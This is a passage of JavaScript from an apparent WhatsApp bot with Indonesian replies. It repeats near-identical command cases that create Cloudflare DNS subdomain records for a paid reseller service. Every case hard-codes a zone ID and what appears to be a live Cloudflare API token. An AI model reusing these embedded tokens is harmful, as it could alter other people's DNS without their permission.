                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya Onii Chan?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = MIKKU - HOST 🛍\n┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break 
case  'd40': {
        if (!isOwner && !isGroup) return tamzz.sendMessage(from, {audio: fs.readFileSync('./tamzz/lusiapa.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:kalgans})
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "dfcb1630d4c47925ec76705d441857aa";
               let apitoken = "Cqpz3ztJyLgUbkTyKz_LSIxEuRyXRkc3E3m5ISdA"
               let tld = "zerowant.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya Onii Chan?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = MIKKU - HOST 🛍\n┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break 
case  'd41': {
        if (!isOwner && !isGroup) return tamzz.sendMessage(from, {audio: fs.readFileSync('./tamzz/lusiapa.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:kalgans})
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "946d5f35d0657cb8bfa442675b37ec42";
               let apitoken = "9IJl3ihBj_McQT6aG0D5MBFQH3YmB1PO7Z34XLr1"
               let tld = "sellerpanel-vvip.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya Onii Chan?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = MIKKU - HOST 🛍\n┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break
case  'd65': {
        if (!isOwner && !isGroup) return tamzz.sendMessage(from, {audio: fs.readFileSync('./tamzz/lusiapa.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:kalgans})
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "d41a17e101c0f89f0aec609c31137f91";
               let apitoken = "miC4wpso1vMcRFR62ZvOFfFd9xTlawvHcXPYZgwi"
               let tld = "panellstore.net";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya Onii Chan?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = MIKKU - HOST 🛍\n┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break
case 'd72': {
    if (!isPremium) return reply("Fitur Ini Khusus Untuk Reseller Subdomain TamzDev\nMau Join? Cuman 5.000 Ajaa\n\nHubungi Owner")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "144f7c48ca035135390fe5adb49d642f";
               let apitoken = "KGhjPqE6foR70mzTnrd4X1DSopNBVtMJJSudc6wi";
               let tld = "kayyoffc.tech";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya Onii Chan?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e[mess.success]) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By TamzDev⚡_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
case 'd73': {
    if (!isPremium) return reply("Fitur Ini Khusus Untuk Reseller Subdomain TamzDev\nMau Join? Cuman 5.000 Ajaa\n\nHubungi Owner")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "4fc8192dd8160307100b207d308da80c";
               let apitoken = "KGhjPqE6foR70mzTnrd4X1DSopNBVtMJJSudc6wi";
               let tld = "kayypedia.com";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya Onii Chan?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e[mess.success]) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By TamzDev⚡_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
case 'd67': {
    if (!isPremium) return reply("Fitur Ini Khusus Untuk Reseller Subdomain TamzDev\nMau Join? Cuman 5.000 Ajaa\n\nHubungi Owner")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "0eb97a28633fbb51b17a32d6fe52dcaf";
               let apitoken = "5rBaTXV30xYNXTVbeB6okU6-61R04HN1lkZNxghp";
               let tld = "celiastore.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya Onii Chan?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e[mess.success]) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By TamzDev⚡_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
case  'd42': {
        if (!isOwner && !isGroup) return tamzz.sendMessage(from, {audio: fs.readFileSync('./tamzz/lusiapa.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:kalgans})
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "fbbab29b950786dc9ca7917747f9b017";
               let apitoken = "zhtsEm27FKPsczF3ro2PipM9i1n8k2rzCyOmvj"
               let tld = "ekiofficial.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya Onii Chan?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = MIKKU - HOST 🛍\n┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break
case 'd75': {
    if (!isPremium) return reply("Fitur Ini Khusus Untuk Reseller Subdomain TamzDev\nMau Join? Cuman 5.000 Ajaa\n\nHubungi Owner")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "a1fa0ffcde9549bd36e9ae3de4b66b4a";
               let apitoken = "KGhjPqE6foR70mzTnrd4X1DSopNBVtMJJSudc6wi";
               let tld = "panell.icu";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya Onii Chan?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e[mess.success]) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By TamzDev⚡_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
case 'd74': {
    if (!isPremium) return reply("Fitur Ini Khusus Untuk Reseller Subdomain TamzDev\nMau Join? Cuman 5.000 Ajaa\n\nHubungi Owner")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "a112599ddfdd5a2bac5dc91864020015";
               let apitoken = "KGhjPqE6foR70mzTnrd4X1DSopNBVtMJJSudc6wi";
               let tld = "panellstoree.com";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya Onii Chan?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e[mess.success]) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By TamzDev⚡_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
case  'd43': {
        if (!isOwner && !isGroup) return tamzz.sendMessage(from, {audio: fs.readFileSync('./tamzz/lusiapa.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:kalgans})
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "4a4818365a74cf535d5b6f16dc62481d";
               let apitoken = "8-zhtsEm27FKPsczF3ro2PipM9i1n8k2rzCyOmvj"
               let tld = "ekioffcial.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya Onii Chan?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = MIKKU - HOST 🛍\n┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break      
case  'd44': {
        if (!isOwner && !isGroup) return tamzz.sendMessage(from, {audio: fs.readFileSync('./tamzz/lusiapa.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:kalgans})
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "d77df730ad2421691e48392be2212425";
               let apitoken = "fhsmn3_iQzBCOfMxjzOyWbG3VLbrFJBW9qAP4hQy"
               let tld = "nw-terbaru-whs.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya Onii Chan?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = MIKKU - HOST 🛍\n┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break
case  'd45': {
        if (!isOwner && !isGroup) return tamzz.sendMessage(from, {audio: fs.readFileSync('./tamzz/lusiapa.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:kalgans})
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "725378afbddffcc9e2c2992ba4232421";
               let apitoken = "MAe0GRPPRxS77oPYXTvImAKNTWit55R63AxuNT1B"
               let tld = "panelku-jasteb.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya Onii Chan?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = MIKKU - HOST 🛍\n┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break
case  'd46': {
        if (!isOwner && !isGroup) return tamzz.sendMessage(from, {audio: fs.readFileSync('./tamzz/lusiapa.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:kalgans})
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "d24389703fb6a0e39980ff480b750bfb";
               let apitoken = "ygaK3KYUw9nzXTX4GTVrry7Do0EcNZ5pau-PcFNC"
               let tld = "tokodigitalonline.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya Onii Chan?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = MIKKU - HOST 🛍\n┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break
case  'd47': {
        if (!isOwner && !isGroup) return tamzz.sendMessage(from, {audio: fs.readFileSync('./tamzz/lusiapa.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:kalgans})
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "705b7ba658c5f033b91b1b7985f53244";
               let apitoken = "Ucf7fYmbCbDuNDGJ1J3KE8noSS3tgNHRQMxCJZk8"
               let tld = "pannel-pvrt.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya Onii Chan?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
